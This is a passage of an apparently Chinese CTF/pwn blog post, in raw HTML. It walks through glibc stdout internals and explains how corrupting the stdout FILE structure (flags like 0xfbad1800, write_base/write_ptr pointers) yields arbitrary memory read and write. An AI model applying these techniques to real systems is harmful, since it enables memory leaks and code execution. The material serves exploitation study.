\</span></span><br><span class="line">   <span class="function"><span class="params">(_IO_BE ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end, <span class="number">0</span>) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">    ? __overflow (_fp, (unsigned char) (_ch)) <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">    : (unsigned char) (*(_fp)-&gt;_IO_write_ptr++ = (_ch)))</span></span></span><br></pre></td></tr></table></figure></p><p>如果_IO_write_ptr&gt;=_IO_write_end说明缓冲区已满，需要调用<strong>overflow来刷新缓冲区，将缓冲区的内容写入文件中，否者_IO_write_ptr指向的内容=ch，然后_IO_write_ptr自增1.</strong>oveflow函数最终调用了_IO_new_file_overflow，其定义如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch) <span class="comment">//底层输出操作，这里的输出指的是向fd指向的文件写入，如果是stdout，即是向终端输出。</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span> (f-&gt;</span>_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span> <span class="comment">//绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="function"><span class="title">if</span> ((f-&gt;</span>_<span class="function"><span class="title">flags</span> &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;</span>_IO_write_base == NULL)<span class="comment">//可能影响_IO_write_base,ptr的值，绕过一下</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_write_base == NULL)</span><br><span class="line">      &#123;</span><br><span class="line">         _IO_doallocbuf (f);</span><br><span class="line">         _IO_<span class="function"><span class="title">setg</span> (f, f-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, f-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, f-&gt;</span>_IO_buf_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="title">size_t</span> nbackup = f-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> - f-&gt;</span>_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> -= MIN (nbackup,f-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> - f-&gt;</span>_IO_buf_base);</span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> == f-&gt;</span>_IO_buf_end)</span><br><span class="line">        <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> = f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_buf_base;</span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = f-&gt;</span>_IO_read_ptr;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = f-&gt;</span>_IO_write_ptr;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = f-&gt;</span>_IO_buf_end;</span><br><span class="line">          <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">read_base</span> = f-&gt;</span>_IO_<span class="function"><span class="title">read_ptr</span> = f-&gt;</span>_IO_read_end;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="function"><span class="title">if</span> (f-&gt;</span>_<span class="function"><span class="title">mode</span> &lt;= 0 &amp;&amp; f-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        <span class="function"><span class="title">f</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = f-&gt;</span>_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="function"><span class="title">return</span> _IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base);</span><br><span class="line">  <span class="function"><span class="title">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> == f-&gt;</span>_IO_buf_end ) <span class="comment">/* Buffer is really full 缓冲区满了，需要刷新缓冲区，将缓冲区内容真正写入文件中*/</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF) </span><br><span class="line">      return EOF;</span><br><span class="line">  *<span class="function"><span class="title">f</span>-&gt;</span>_IO_write_ptr++ = ch; </span><br><span class="line">  <span class="function"><span class="title">if</span> ((f-&gt;</span>_<span class="function"><span class="title">flags</span> &amp; _IO_UNBUFFERED) || ((f-&gt;</span>_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="function"><span class="title">if</span> (_IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  return (unsigned char) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果ch==EOF会调用_IO_do_write函数，如果_IO_write_ptr == _IO_buf_end ，则说明缓冲区已满，调用_IO_do_flush来刷新缓冲区.<br>其实_IO_do_flush也是调用了_IO_do_write:<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define _IO_do_flush(_f) \</span></span><br><span class="line">  _IO_do_write<span class="function"><span class="params">(_f, (_f)-&gt;_IO_write_base,      <span class="string">\</span></span></span></span><br><span class="line"><span class="function"><span class="params">       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span></span><br></pre></td></tr></table></figure></p><p>_IO_do_write调用了new_do_write,其定义如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static</span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, const char *<span class="keyword">data</span>, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_flags &amp; _IO_IS_APPENDING) </span><br><span class="line">    <span class="function"><span class="title">fp</span>-&gt;</span>_offset = _IO_pos_BAD;<span class="comment">// -1</span></span><br><span class="line">  <span class="function"><span class="title">else</span> <span class="keyword">if</span> (fp-&gt;</span>_IO_<span class="function"><span class="title">read_end</span> != fp-&gt;</span>_IO_write_base)<span class="comment">//需要绕过！！！这一步</span></span><br><span class="line">    &#123;</span><br><span class="line">      _IO_<span class="function"><span class="title">off64_t</span> new_pos = _IO_SYSSEEK (fp, fp-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> - fp-&gt;</span>_IO_read_end, <span class="number">1</span>);<span class="comment">//???不清楚原因</span></span><br><span class="line">      <span class="comment">//define SEEK_CUR 1,以目前的读写位置往后增加offset个位移量.</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        return <span class="number">0</span>;</span><br><span class="line">      <span class="function"><span class="title">fp</span>-&gt;</span>_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, <span class="keyword">data</span>, to_do);<span class="comment">//将缓冲区的内容真正写入设备中</span></span><br><span class="line">  <span class="comment">//最终调用了write()，它完成的操作是将用户缓冲区的文件内容写入到文件中</span></span><br><span class="line">  <span class="function"><span class="title">if</span> (fp-&gt;</span>_cur_column &amp;&amp; count)</span><br><span class="line">    <span class="function"><span class="title">fp</span>-&gt;</span>_<span class="function"><span class="title">cur_column</span> = _IO_adjust_column (fp-&gt;</span>_cur_column - <span class="number">1</span>, <span class="keyword">data</span>, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_<span class="function"><span class="title">setg</span> (fp, fp-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, fp-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span>, fp-&gt;</span>_IO_buf_base);</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> = fp-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> = fp-&gt;</span>_IO_buf_base;</span><br><span class="line">  <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> = (fp-&gt;</span>_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (<span class="function"><span class="title">fp</span>-&gt;</span>_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? <span class="function"><span class="title">fp</span>-&gt;</span>_IO_<span class="function"><span class="title">buf_base</span> : fp-&gt;</span>_O_buf_end);</span><br><span class="line">  return count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该函数最后调用了write函数，将缓冲区的内容输出到文件中。<br>最初时write_ptr = write_base , 向缓冲区写入东西时，write_ptr指针的值增大，当将缓冲区的内容写入文件中时，是从_IO_write_base指向的内容开始写入到文件，到_IO_write_ptr结束。</p><h5 id="利用手法：-1"><a href="#利用手法：-1" class="headerlink" title="利用手法："></a>利用手法：</h5><p>修改stdout结构体：<br>绕过一下检查:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_NO_WRITES</span>) <span class="comment">/* SET ERROR */</span> <span class="comment">//绕过他</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;<span class="variable">_flags</span> |= <span class="variable">_IO_ERR_SEEN</span>;</span><br><span class="line">      <span class="variable">__set_errno</span> (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">if</span> ((f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_CURRENTLY_PUTTING</span>) == <span class="number">0</span> || f-&gt;<span class="variable">_IO_write_base</span> == NULL)<span class="comment">//绕过他</span></span><br><span class="line">   ........</span><br></pre></td></tr></table></figure></p><p>new_do_write里也需要绕过一下:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_IS_APPENDING</span>) </span><br><span class="line">    fp-&gt;<span class="variable">_offset</span> = <span class="variable">_IO_pos_BAD</span>;<span class="comment">// -1</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;<span class="variable">_IO_read_end</span> != fp-&gt;<span class="variable">_IO_write_base</span>)<span class="comment">//需要绕过！！！这一步</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">_IO_off64_t</span> new_pos = <span class="variable">_IO_SYSSEEK</span> (fp, fp-&gt;<span class="variable">_IO_write_base</span> - fp-&gt;<span class="variable">_IO_read_end</span>, <span class="number">1</span>);<span class="comment">//???不清楚原因</span></span><br><span class="line">      <span class="comment">//define SEEK_CUR 1,以目前的读写位置往后增加offset个位移量.</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == <span class="variable">_IO_pos_BAD</span>)</span><br><span class="line">        return <span class="number">0</span>;</span><br><span class="line">      fp-&gt;<span class="variable">_offset</span> = new_pos;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>不能执行else if这个分支…，可以设置flag位绕过，也可以让fp-&gt;_IO_read_end = fp-&gt;_IO_write_base<br>如果某些情况不能够控制fp-&gt;_IO_read_end = fp-&gt;_IO_write_base，则可以通过控制flags位来绕过.</p><hr><p>通解手法:<br>设置flags位绕过检查:<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">flags</span>=flags&amp;~_IO_NO_WRITES</span><br><span class="line"><span class="attr">flags</span>=flags|_IO_CURRENTLY_PUTTING</span><br><span class="line"><span class="attr">flags</span>=flags|_IO_IS_APPENDING</span><br></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES 8，</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure><p>flags设置完后大约是 <code>0xfbad1800</code> 前面是魔数,其实开头并不一定是0xfbad… ,只要能绕过检查即可.<br>再设置_IO_write_base为想要泄露的起始地址，_IO_write_ptr为想要泄露的结束地址即可，这样就可以达到任意读。</p><h4 id="puts函数："><a href="#puts函数：" class="headerlink" title="puts函数："></a>puts函数：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line"><span class="variable">_IO_puts</span> (const char *<span class="built_in">str</span>)</span><br><span class="line">&#123;</span><br><span class="line">  int result = EOF;</span><br><span class="line">  <span class="variable">_IO_size_t</span> len = strlen (<span class="built_in">str</span>);</span><br><span class="line">  <span class="variable">_IO_acquire_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="variable">_IO_vtable_offset</span> (<span class="variable">_IO_stdout</span>) != <span class="number">0</span></span><br><span class="line">       || <span class="variable">_IO_fwide</span> (<span class="variable">_IO_stdout</span>, -<span class="number">1</span>) == -<span class="number">1</span>)</span><br><span class="line">      &amp;&amp; <span class="variable">_IO_sputn</span> (<span class="variable">_IO_stdout</span>, <span class="built_in">str</span>, len) == len</span><br><span class="line">      &amp;&amp; <span class="variable">_IO_putc_unlocked</span> (<span class="string">'\n'</span>, <span class="variable">_IO_stdout</span>) != EOF)</span><br><span class="line">    result = <span class="built_in">MIN</span> (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">_IO_release_lock</span> (<span class="variable">_IO_stdout</span>);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>puts函数是打印str里的内容，顺面在末尾加个\n,_IO_putc_unlocked之前已经分析过了，这里分析下_IO_sputn , _IO_sputn其实是调用了_IO_new_file_xsputn:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_IO_size_t</span></span><br><span class="line"><span class="variable">_IO_new_file_xsputn</span> (<span class="variable">_IO_FILE</span> *f, const void *data, <span class="variable">_IO_size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  const char *s = (const char *) data;</span><br><span class="line">  <span class="variable">_IO_size_t</span> to_do = n;</span><br><span class="line">  int must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">_IO_size_t</span> <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_LINE_BUF</span>) &amp;&amp; (f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_CURRENTLY_PUTTING</span>))<span class="comment">//绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">count</span> = f-&gt;<span class="variable">_IO_buf_end</span> - f-&gt;<span class="variable">_IO_write_ptr</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">      const char *p;</span><br><span class="line">      <span class="keyword">for</span> (p = s + n; p &gt; s; ) <span class="comment">//s是data首地址</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (*--p == <span class="string">'\n'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">count</span> = p - s + <span class="number">1</span>;</span><br><span class="line">                must_flush = <span class="number">1</span>;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;<span class="variable">_IO_write_end</span> &gt; f-&gt;<span class="variable">_IO_write_ptr</span>)</span><br><span class="line">    <span class="built_in">count</span> = f-&gt;<span class="variable">_IO_write_end</span> - f-&gt;<span class="variable">_IO_write_ptr</span>; <span class="comment">/*缓冲区没有满，计算还剩多少空间*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*将即将输出的内容复制到缓冲区里*/</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">count</span> &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> &gt; to_do)</span><br><span class="line">      <span class="built_in">count</span> = to_do;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;<span class="variable">_IO_write_ptr</span> = <span class="variable">__mempcpy</span> (f-&gt;<span class="variable">_IO_write_ptr</span>, s, <span class="built_in">count</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      memcpy (f-&gt;<span class="variable">_IO_write_ptr</span>, s, <span class="built_in">count</span>);<span class="comment">//从_IO_write_ptr开始复制</span></span><br><span class="line">      f-&gt;<span class="variable">_IO_write_ptr</span> += <span class="built_in">count</span>;<span class="comment">//此时_IO_write_ptr 等于 _IO_write_end</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      s += <span class="built_in">count</span>; <span class="comment">//s指向还没有复制的位置</span></span><br><span class="line">      to_do -= <span class="built_in">count</span>;<span class="comment">//剩下需要输出的字符的个数</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">_IO_size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">_IO_OVERFLOW</span> (f, EOF) == EOF)<span class="comment">//调用了_IO_new_file_overflow刷新输出缓冲区</span></span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line">        return to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;<span class="variable">_IO_buf_end</span> - f-&gt;<span class="variable">_IO_buf_base</span>;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">count</span> = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= <span class="built_in">count</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">count</span> &lt; do_write)</span><br><span class="line">        return n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it's somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">        to_do -= <span class="variable">_IO_default_xsputn</span> (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  return n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果输出缓冲区没有满，_IO_new_file_xsputn函数会先把将要输出的字符串复制到输出缓冲区中：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ....</span><br><span class="line"> <span class="function"><span class="title">else</span> <span class="keyword">if</span> (f-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> &gt; f-&gt;</span>_IO_write_ptr)</span><br><span class="line">    <span class="function"><span class="title">count</span> = f-&gt;</span>_IO_<span class="function"><span class="title">write_end</span> - f-&gt;</span>_IO_write_ptr; <span class="comment">/*缓冲区没有满，计算还剩多少空间*/</span></span><br><span class="line"> ....</span><br><span class="line"><span class="function"><span class="title">memcpy</span> (f-&gt;</span>_IO_write_ptr, s, count);<span class="comment">//从_IO_write_ptr开始复制</span></span><br><span class="line">      <span class="function"><span class="title">f</span>-&gt;</span>_IO_write_ptr += count;<span class="comment">//此时_IO_write_ptr 等于 _IO_write_end</span></span><br></pre></td></tr></table></figure></p><p>然后再调用<code>_IO_OVERFLOW (f, EOF)</code>来刷新输出缓冲区。_IO_OVERFLOW就是_IO_new_file_overflow，在前面已经分析过了。<br>由于ch == EOF，会直接执行以下语句:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">   <span class="function"><span class="title">return</span> _IO_do_write (f, f-&gt;</span>_IO_<span class="function"><span class="title">write_base</span> , f-&gt;</span>_IO_<span class="function"><span class="title">write_ptr</span> - f-&gt;</span>_IO_write_base);</span><br></pre></td></tr></table></figure></p><p>可以看出，_IO_new_file_xsputn函数完成了两个功能，当输出缓冲区还没有满时，会将即将打印的字符串复制到输出缓冲区中，填满输出缓冲区。然后调用_IO_new_file_overflow刷新输出缓冲区。所以_IO_new_file_xsputn函数即能达到任意写的功能，还可以达到任意读的功能。</p><h5 id="利用手法：-2"><a href="#利用手法：-2" class="headerlink" title="利用手法："></a>利用手法：</h5><p><strong>任意写：</strong></p><p>任意写就是利用了memcpy<br>需要提前准备好想要覆写的字符串，<br>修改stdout结构体：<br>设置flags绕过:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_LINE_BUF</span>) &amp;&amp; (f-&gt;<span class="variable">_flags</span> &amp; <span class="variable">_IO_CURRENTLY_PUTTING</span>))<span class="comment">//绕过</span></span><br></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br></pre></td></tr></table></figure><p>然后设置_IO_write_ptr为想要写的起始地址，_IO_write_end为想要写的末尾地址即可。</p><p><strong>任意读:</strong></p><p>任意读需要先绕过前面的复制字符串操作(因为会覆盖想要泄露的内容)：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">count</span> = f-&gt;<span class="variable">_IO_write_end</span> - f-&gt;<span class="variable">_IO_write_ptr</span>; <span class="comment">/*缓冲区没有满，计算还剩多少空间*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*将即将输出的内容复制到缓冲区里*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">count</span> &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      ....</span><br><span class="line">    memcpy (f-&gt;<span class="variable">_IO_write_ptr</span>, s, <span class="built_in">count</span>);<span class="comment">//从_IO_write_ptr开始复制</span></span><br><span class="line">    